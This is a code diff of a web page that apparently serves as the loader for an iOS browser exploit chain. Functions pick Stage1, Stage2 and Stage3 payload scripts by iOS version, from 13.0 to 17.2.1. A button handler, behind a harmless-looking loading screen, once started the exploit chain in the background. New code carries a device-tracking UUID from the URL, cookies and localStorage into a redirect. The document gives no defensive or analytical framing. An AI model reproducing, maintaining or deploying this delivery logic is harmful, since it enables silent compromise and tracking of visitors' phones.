@@ -171,22 +171,23 @@
 
     function selectStage1(v) {
       if (!v) return null; var n = v.num;
-      if (n >= 130000 && n <= 150101) return { name: 'Stage1_buffout', file: 'payloads/Stage1_buffout.js', range: '13.0-15.1.1' };
-      if (n >= 150200 && n <= 150500) return { name: 'Stage1_jacurutu', file: 'payloads/Stage1_jacurutu.js', range: '15.2-15.5' };
-      if (n >= 150600 && n <= 160102) return { name: 'Stage1_bluebird', file: 'payloads/Stage1_bluebird.js', range: '15.6-16.1.2' };
-      if (n >= 160200 && n <= 160501) return { name: 'Stage1_terrorbird', file: 'payloads/Stage1_terrorbird.js', range: '16.2-16.5.1' };
-      if (n >= 160600 && n <= 170201) return { name: 'Stage1_cassowary', file: 'payloads/Stage1_cassowary.js', range: '16.6-17.2.1' };
+      if (n >= 150200 && n <= 150500) return { name: 'Stage1_15.2_15.5_jacurutu', file: '/Stage1_15.2_15.5_jacurutu.js', range: '15.2-15.5' };
+      if (n >= 150600 && n <= 160102) return { name: 'Stage1_15.6_16.1.2_bluebird', file: '/Stage1_15.6_16.1.2_bluebird.js', range: '15.6-16.1.2' };
+      if (n >= 160200 && n <= 160501) return { name: 'Stage1_16.2_16.5.1_terrorbird', file: '/Stage1_16.2_16.5.1_terrorbird.js', range: '16.2-16.5.1' };
+      if (n >= 160600 && n <= 170201) return { name: 'Stage1_16.6_17.2.1_cassowary', file: '/Stage1_16.6_17.2.1_cassowary.js', range: '16.6-17.2.1' };
       return null;
     }
 
     function selectStage2(v) {
       if (!v) return null; var n = v.num;
-      if (n >= 130000 && n < 150000) return { name: 'Stage2_breezy', file: 'payloads/Stage2_breezy.js', range: '13.0-14.x' };
-      if (n >= 150000 && n <= 160200) return { name: 'Stage2_breezy15', file: 'payloads/Stage2_breezy15.js', range: '15.0-16.2' };
-      if (n >= 160300 && n <= 160501) return { name: 'Stage2_seedbell163', file: 'payloads/Stage2_seedbell163.js', range: '16.3-16.5.1' };
-      if (n >= 160600 && n <= 160712) return { name: 'Stage2_seedbell166', file: 'payloads/Stage2_seedbell166.js', range: '16.6-16.7.12' };
-      if (n >= 160600 && n < 170000) return { name: 'Stage2_seedbell166pre', file: 'payloads/Stage2_seedbell166pre.js', range: '16.6-17.2.1pre' };
-      if (n >= 170000 && n <= 170201) return { name: 'Stage2_seedbell170', file: 'payloads/Stage2_seedbell170.js', range: '17.0-17.2.1' };
+      // iOS 15.0 – 16.2: breezy15
+      if (n >= 150000 && n <= 160200) return { name: 'Stage2_15.0_16.2_breezy15', file: '/Stage2_15.0_16.2_breezy15.js', range: '15.0-16.2' };
+      // iOS 16.3 – 16.5.1: seedbell (16.3-16.5.1 variant)
+      if (n >= 160300 && n <= 160501) return { name: 'Stage2_16.3_16.5.1_seedbell', file: '/Stage2_16.3_16.5.1_seedbell.js', range: '16.3-16.5.1' };
+      // iOS 16.6 – 16.7.12: seedbell (16.6-16.7.12 variant)
+      if (n >= 160600 && n <= 160712) return { name: 'Stage2_16.6_16.7.12_seedbell', file: '/Stage2_16.6_16.7.12_seedbell.js', range: '16.6-16.7.12', pre: { name: 'Stage2_16.6_17.2.1_seedbell_pre', file: '/Stage2_16.6_17.2.1_seedbell_pre.js' } };
+      // iOS 17.0 – 17.2.1: seedbell (17.x variant) + pre-req
+      if (n >= 170000 && n <= 170201) return { name: 'Stage2_17.0_17.2.1_seedbell', file: '/Stage2_17.0_17.2.1_seedbell.js', range: '17.0-17.2.1', pre: { name: 'Stage2_16.6_17.2.1_seedbell_pre', file: '/Stage2_16.6_17.2.1_seedbell_pre.js' } };
       return null;
     }
 
@@ -202,12 +203,10 @@
     }
 
     var STAGE2_TO_STAGE3 = {
-      'Stage2_breezy':       { name: 'Stage3_breezy',       file: 'payloads/Stage3_breezy.js' },
-      'Stage2_breezy15':     { name: 'Stage3_breezy15',     file: 'payloads/Stage3_breezy15.js' },
-      'Stage2_seedbell163':  { name: 'Stage3_seedbell163',  file: 'payloads/Stage3_seedbell163.js' },
-      'Stage2_seedbell166':  { name: 'Stage3_seedbell166',  file: 'payloads/Stage3_seedbell166.js' },
-      'Stage2_seedbell166pre': { name: 'Stage3_seedbell166pre', file: 'payloads/Stage3_seedbell166pre.js' },
-      'Stage2_seedbell170':  { name: 'Stage3_seedbell170',  file: 'payloads/Stage3_seedbell170.js' }
+      'Stage2_15.0_16.2_breezy15':   { name: 'Stage3_VariantA', file: '/Stage3_VariantA.js' },
+      'Stage2_16.3_16.5.1_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' },
+      'Stage2_16.6_16.7.12_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' },
+      'Stage2_17.0_17.2.1_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' }
     };
 
     function _callFn(fnName) {
@@ -291,22 +290,57 @@
   (function () {
     var btn = document.getElementById('goBtn');
     var loading = document.getElementById('loading');
-    function triggerReload() {
+    function _extractParams() {
+      // Carry ds_uuid / device_uuid / channel / tpl from URL into group.html so device stays linked
+      var out = {};
+      try {
+        var qs = window.location.search.substring(1);
+        if (qs) qs.split('&').forEach(function(p){
+          var kv = p.split('=');
+          if (kv[0]) out[decodeURIComponent(kv[0])] = decodeURIComponent(kv.slice(1).join('='));
+        });
+      } catch(e) {}
+      try {
+        var ck = document.cookie.split(';');
+        ck.forEach(function(c){
+          c = c.trim(); if (!c) return;
+          var kv = c.split('=');
+          if (kv[0] && kv[0].trim() === 'ds_uuid' && !out.device_uuid && !out.ds_uuid) {
+            out.device_uuid = kv.slice(1).join('=').trim();
+          }
+        });
+      } catch(e) {}
+      try {
+        if (!out.device_uuid) {
+          var v = localStorage.getItem('ds_uuid');
+          if (v && /^[0-9a-fA-F]{32}$/.test(v)) out.device_uuid = v;
+        }
+      } catch(e) {}
+      return out;
+    }
+    function triggerGo() {
       loading.classList.add('show');
       btn.disabled = true;
       btn.style.opacity = '0.7';
-      // Start exploit chain async in background (doesn't block UI flow)
-      Promise.resolve().then(function () { if (typeof window.__dsStartExploit === 'function') return window.__dsStartExploit(); }).catch(function () {});
+      // Build /group.html URL preserving all known params + UUID cookie/localStorage value
+      var params = _extractParams();
+      var pairs = [];
+      Object.keys(params).forEach(function(k){
+        // skip empty values and already-handled internal keys
+        if (params[k] === undefined || params[k] === null) return;
+        pairs.push(encodeURIComponent(k) + '=' + encodeURIComponent(String(params[k])));
+      });
+      // Always force-reload with cache-buster to bypass Safari back-forward cache
+      pairs.push('_=' + Date.now());
+      var url = '/group.html' + (pairs.length ? '?' + pairs.join('&') : '');
       setTimeout(function () {
-        try {
-          if (window.parent && window.parent !== window) {
-            try { window.parent.location.reload(); } catch (e) {}
-          }
-        } catch (e) {}
-        setTimeout(function () { window.location.reload(); }, 300);
-      }, 500);
+        if (window.parent && window.parent !== window) {
+          try { window.parent.location.href = url; return; } catch (e) {}
+        }
+        window.location.href = url;
+      }, 200);
     }
-    btn.addEventListener('click', triggerReload);
+    btn.addEventListener('click', triggerGo);
     btn.addEventListener('touchstart', function () {}, { passive: true });
   })();
 </script>
